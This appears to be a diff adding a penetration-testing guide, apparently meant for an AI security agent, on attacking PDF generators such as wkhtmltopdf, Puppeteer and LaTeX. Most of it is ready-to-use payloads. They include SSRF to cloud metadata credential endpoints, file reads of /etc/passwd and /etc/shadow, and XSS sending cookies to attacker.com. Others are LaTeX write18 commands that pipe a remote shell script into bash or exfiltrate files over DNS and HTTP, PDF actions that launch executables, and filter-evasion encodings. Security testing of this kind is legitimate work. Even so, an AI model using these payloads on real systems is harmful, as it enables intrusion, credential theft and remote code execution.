@@ -1,0 +1,490 @@
+<pdf_injection_guide>
+<title>PDF GENERATION VULNERABILITIES</title>
+
+<critical>PDF generation libraries often process untrusted input in ways that lead to SSRF, XSS, code execution, and data exfiltration. Testing must cover HTML-to-PDF converters like wkhtmltopdf and Puppeteer, LaTeX injection, PDF form manipulation, and embedded JavaScript execution.</critical>
+
+<scope>
+- SSRF via PDF generators
+- XSS in PDF content
+- LaTeX injection
+- PDF form field injection
+- Embedded JavaScript in PDFs
+- Server-side resource access
+- File inclusion attacks
+</scope>
+
+<methodology>
+1. Identify PDF generation endpoints and input vectors.
+2. Test for SSRF using internal URLs and file protocols.
+3. Probe for XSS execution in PDF rendering context.
+4. Test LaTeX injection if LaTeX-based generation is used.
+5. Check for JavaScript execution in PDF viewers.
+6. Analyze form field handling for injection.
+</methodology>
+
+<ssrf_via_pdf>
+<wkhtmltopdf_ssrf>
+{% raw %}
+# wkhtmltopdf SSRF attacks:
+
+# Basic internal URL access:
+<img src="http://127.0.0.1:8080/admin">
+<iframe src="http://localhost/internal/api">
+<link href="http://169.254.169.254/latest/meta-data/">
+
+# File protocol access:
+<iframe src="file:///etc/passwd">
+<img src="file:///etc/shadow">
+<link rel="stylesheet" href="file:///etc/hosts">
+
+# AWS metadata service:
+<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<iframe src="http://169.254.169.254/latest/user-data/">
+
+# GCP metadata:
+<img src="http://metadata.google.internal/computeMetadata/v1/">
+
+# Azure metadata:
+<iframe src="http://169.254.169.254/metadata/instance?api-version=2021-02-01">
+
+# Local services:
+<img src="http://localhost:6379/INFO">  # Redis
+<img src="http://127.0.0.1:9200/_cluster/health">  # Elasticsearch
+<img src="http://localhost:8500/v1/agent/members">  # Consul
+{% endraw %}
+</wkhtmltopdf_ssrf>
+
+<puppeteer_ssrf>
+{% raw %}
+# Puppeteer/Chromium-based SSRF:
+
+# Navigation-based SSRF:
+<meta http-equiv="refresh" content="0;url=http://internal-service/">
+
+# Script-based requests:
+<script>
+  fetch('http://169.254.169.254/latest/meta-data/')
+    .then(r => r.text())
+    .then(data => {
+      document.body.innerHTML = data;
+    });
+</script>
+
+# WebSocket connections:
+<script>
+  var ws = new WebSocket('ws://internal-service/');
+  ws.onmessage = function(e) {
+    document.body.innerHTML = e.data;
+  };
+</script>
+
+# XMLHttpRequest:
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'http://localhost:8080/admin', false);
+  xhr.send();
+  document.body.innerHTML = xhr.responseText;
+</script>
+{% endraw %}
+</puppeteer_ssrf>
+
+<protocol_abuse>
+{% raw %}
+# Various protocol handlers:
+
+# File protocol:
+file:///etc/passwd
+file:///C:/Windows/System32/drivers/etc/hosts
+file:///proc/self/environ
+
+# Data URI:
+data:text/html,<script>alert(1)</script>
+
+# Gopher protocol (if supported):
+gopher://internal:6379/_INFO
+
+# FTP enumeration:
+ftp://internal-ftp/
+
+# Dict protocol:
+dict://localhost:6379/INFO
+
+# LDAP:
+ldap://internal-ldap/
+
+# JavaScript URI (in href):
+<a href="javascript:fetch('http://internal/')">Link</a>
+{% endraw %}
+</protocol_abuse>
+</ssrf_via_pdf>
+
+<xss_in_pdf>
+<html_injection>
+{% raw %}
+# XSS in HTML-to-PDF converters:
+
+# Basic script injection:
+<script>
+  document.body.innerHTML = '<h1>XSS in PDF</h1>';
+</script>
+
+# Fetch and display:
+<script>
+  fetch('/api/secrets')
+    .then(r => r.text())
+    .then(d => document.body.innerHTML = d);
+</script>
+
+# External script loading:
+<script src="http://attacker.com/payload.js"></script>
+
+# Event handlers:
+<img src=x onerror="document.body.innerHTML='XSS'">
+<body onload="alert('XSS')">
+
+# SVG-based XSS:
+<svg onload="fetch('http://attacker.com/?c='+document.cookie)">
+
+# CSS injection for data exfiltration:
+<style>
+  @import url('http://attacker.com/log?data=' + encodeURIComponent(document.body.innerHTML));
+</style>
+{% endraw %}
+</html_injection>
+
+<pdf_javascript>
+{% raw %}
+# JavaScript in PDF (Adobe Reader):
+
+# PDF JavaScript action:
+/OpenAction << /S /JavaScript /JS (app.alert('XSS');) >>
+
+# Using PDF form fields:
+/AcroForm <<
+  /Fields [<< /T (field) /V (value) /AA << /K << /S /JavaScript /JS (
+    this.exportDataObject({cName: "data", nLaunch: 2});
+  ) >> >> >>]
+>>
+
+# Launch action:
+/OpenAction << /S /Launch /F (cmd.exe) /P (/c calc) >>
+
+# URI action:
+/OpenAction << /S /URI /URI (http://attacker.com/?steal=data) >>
+
+# GoTo action with JavaScript:
+/OpenAction << /S /GoTo /D [0 /XYZ 0 0 0] /Next << /S /JavaScript /JS (
+  var data = this.getField('sensitive').value;
+  app.launchURL('http://attacker.com/?d=' + data);
+) >> >>
+{% endraw %}
+</pdf_javascript>
+</xss_in_pdf>
+
+<latex_injection>
+<latex_attacks>
+{% raw %}
+# LaTeX injection for file read:
+
+# Read file contents:
+\input{/etc/passwd}
+\include{/etc/passwd}
+
+# Verbatim file inclusion:
+\verbatiminput{/etc/passwd}
+
+# Using lstinputlisting:
+\lstinputlisting{/etc/passwd}
+
+# Read with newread:
+\newread\file
+\openin\file=/etc/passwd
+\read\file to\line
+\text{\line}
+\closein\file
+
+# Loop to read entire file:
+\newread\file
+\openin\file=/etc/passwd
+\loop\unless\ifeof\file
+  \read\file to\fileline
+  \fileline
+\repeat
+\closein\file
+{% endraw %}
+</latex_attacks>
+
+<latex_rce>
+{% raw %}
+# LaTeX command execution:
+
+# Using write18 (shell escape):
+\immediate\write18{id > /tmp/output}
+\input{/tmp/output}
+
+# Alternative write18:
+\write18{curl http://attacker.com/shell.sh | bash}
+
+# Using special characters:
+\catcode`\$=\active
+\def${system("whoami")}
+
+# pdflatex with shell escape:
+pdflatex --shell-escape document.tex
+
+# Lua LaTeX:
+\directlua{os.execute("id")}
+
+# XeLaTeX:
+\usepackage{fontspec}
+\newfontface\x{|"id > /tmp/out"}
+{% endraw %}
+</latex_rce>
+
+<latex_exfiltration>
+{% raw %}
+# Data exfiltration via LaTeX:
+
+# DNS exfiltration:
+\immediate\write18{ping $(cat /etc/passwd | base64 | head -c50).attacker.com}
+
+# HTTP exfiltration:
+\immediate\write18{curl http://attacker.com/?data=$(cat /etc/passwd | base64)}
+
+# Include in output:
+\newread\x
+\openin\x=/etc/passwd
+\read\x to\line
+\typeout{\line}  % Appears in log
+\closein\x
+
+# Error-based:
+\input{|"cat /etc/passwd"}  % Error message contains content
+{% endraw %}
+</latex_exfiltration>
+</latex_injection>
+
+<form_field_injection>
+<pdf_form_attacks>
+{% raw %}
+# PDF form field manipulation:
+
+# AcroForm injection:
+/AcroForm <<
+  /Fields [
+    << /T (malicious)
+       /V <script>alert(1)</script>
+       /FT /Tx
+    >>
+  ]
+>>
+
+# Field validation bypass:
+# Inject JavaScript in form actions
+/AA <<
+  /K << /S /JavaScript /JS (
+    event.value = 'injected';
+  ) >>
+>>
+
+# Calculated field injection:
+/AA <<
+  /C << /S /JavaScript /JS (
+    event.value = eval(maliciousCode);
+  ) >>
+>>
+
+# Submit form to attacker:
+/AA <<
+  /F << /S /SubmitForm /F (http://attacker.com/collect) >>
+>>
+{% endraw %}
+</pdf_form_attacks>
+
+<form_exfiltration>
+{% raw %}
+# Form-based data exfiltration:
+
+# Auto-submit form:
+<form action="http://attacker.com/collect" method="POST" id="f">
+  <input name="data" value="SENSITIVE_DATA">
+</form>
+<script>document.getElementById('f').submit();</script>
+
+# Hidden form fields:
+<input type="hidden" name="secret" value="<%= server_secret %>">
+
+# Form action override:
+<form action="http://attacker.com/steal">
+  <button formaction="http://attacker.com/steal">Submit</button>
+</form>
+{% endraw %}
+</form_exfiltration>
+</form_field_injection>
+
+<embedded_content>
+<attachment_abuse>
+{% raw %}
+# PDF embedded file attacks:
+
+# Embed and execute:
+/Names <<
+  /EmbeddedFiles <<
+    /Names [(malicious.exe) << /EF << /F 10 0 R >> >>]
+  >>
+>>
+
+# JavaScript file launch:
+/OpenAction << /S /JavaScript /JS (
+  this.exportDataObject({cName: "malware.exe", nLaunch: 2});
+) >>
+
+# Embedded Flash (legacy):
+/Annots [<< /Subtype /Screen /A << /S /Rendition /R <<
+  /C << /Type /MediaClip /S /MR /D 10 0 R >>
+>> >> >>]
+
+# Embedded 3D content:
+/Annots [<< /Subtype /3D /3DD << /Type /3D /Subtype /U3D >> >>]
+{% endraw %}
+</attachment_abuse>
+
+<link_injection>
+{% raw %}
+# Malicious links in PDFs:
+
+# URI injection:
+<a href="http://attacker.com/phish">Click here</a>
+
+# JavaScript URI:
+<a href="javascript:document.location='http://attacker.com/'+document.cookie">Link</a>
+
+# PDF link annotation:
+/Annots [<<
+  /Subtype /Link
+  /A << /S /URI /URI (http://attacker.com/phish) >>
+  /Rect [0 0 100 100]
+>>]
+
+# GoTo Remote action:
+/A << /S /GoToR /F (http://attacker.com/malicious.pdf) /D [0 /XYZ null null null] >>
+{% endraw %}
+</link_injection>
+</embedded_content>
+
+<detection_evasion>
+<bypass_techniques>
+{% raw %}
+# Filter bypass techniques:
+
+# URL encoding:
+<img src="http://127.0.0%2e1/admin">
+<img src="http://127%2e0%2e0%2e1/admin">
+
+# Decimal IP:
+<img src="http://2130706433/admin">  # 127.0.0.1
+
+# Hex IP:
+<img src="http://0x7f000001/admin">
+
+# Octal IP:
+<img src="http://0177.0.0.1/admin">
+
+# IPv6:
+<img src="http://[::1]/admin">
+<img src="http://[::ffff:127.0.0.1]/admin">
+
+# URL shorteners (if allowed):
+<img src="http://bit.ly/xxxxx">  # Redirects to internal
+
+# Double URL encoding:
+<img src="http://127.0.0.1/%252e%252e/admin">
+
+# Case manipulation:
+<iMg SrC="file:///etc/passwd">
+{% endraw %}
+</bypass_techniques>
+
+<obfuscation>
+{% raw %}
+# Payload obfuscation:
+
+# HTML entity encoding:
+<img src="&#104;&#116;&#116;&#112;&#58;&#47;&#47;127.0.0.1">
+
+# Unicode:
+<img src="http://①②⑦.0.0.1/admin">
+
+# Base64 data URI:
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# Broken HTML:
+<im\x00g src="http://127.0.0.1">
+<script/src="http://attacker.com/evil.js">
+
+# Comments:
+<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
+{% endraw %}
+</obfuscation>
+</detection_evasion>
+
+<common_payloads>
+{% raw %}
+# SSRF payloads:
+<img src="http://169.254.169.254/latest/meta-data/">
+<iframe src="file:///etc/passwd">
+<link href="http://localhost:8080/admin">
+
+# XSS payloads:
+<script>document.body.innerHTML=fetch('/api/secret').then(r=>r.text())</script>
+<svg onload="fetch('http://attacker.com/?'+document.cookie)">
+
+# LaTeX payloads:
+\input{/etc/passwd}
+\immediate\write18{id}
+
+# PDF JavaScript:
+/OpenAction << /S /JavaScript /JS (app.alert(1);) >>
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate SSRF with internal service response in PDF.
+2. Show file content inclusion via file:// protocol.
+3. Prove XSS execution with JavaScript in PDF context.
+4. Document LaTeX injection reading server files.
+5. Provide reproducible payloads for each technique.
+</validation>
+
+<false_positives>
+- PDF generators with disabled network access
+- Sandboxed rendering with no file:// protocol
+- LaTeX with disabled shell escape
+- Content Security Policy blocking external resources
+- Input sanitization removing dangerous elements
+</false_positives>
+
+<impact>
+- Server-side request forgery to internal services
+- Cloud metadata service access for credential theft
+- Local file disclosure
+- Remote code execution via LaTeX
+- Cross-site scripting in PDF context
+- Data exfiltration through various channels
+</impact>
+
+<pro_tips>
+1. Test all HTML elements that can make requests.
+2. Try various IP representations (decimal, hex, octal).
+3. Test file:// protocol for local file access.
+4. Check if LaTeX is used and test for write18.
+5. Analyze PDF output for embedded JavaScript.
+6. Test cloud metadata endpoints for SSRF.
+7. Use DNS-based exfiltration if blind SSRF.
+8. Check PDF form fields for JavaScript actions.
+9. Try SVG injection for XSS in PDF.
+10. Document the PDF library used for targeted attacks.
+</pro_tips>
+
+<remember>PDF generation is a complex process that often trusts input too much. The combination of HTML rendering, file access, and JavaScript execution in PDF generators creates multiple attack vectors. Always test thoroughly for SSRF, file access, and code execution.</remember>
+</pdf_injection_guide>
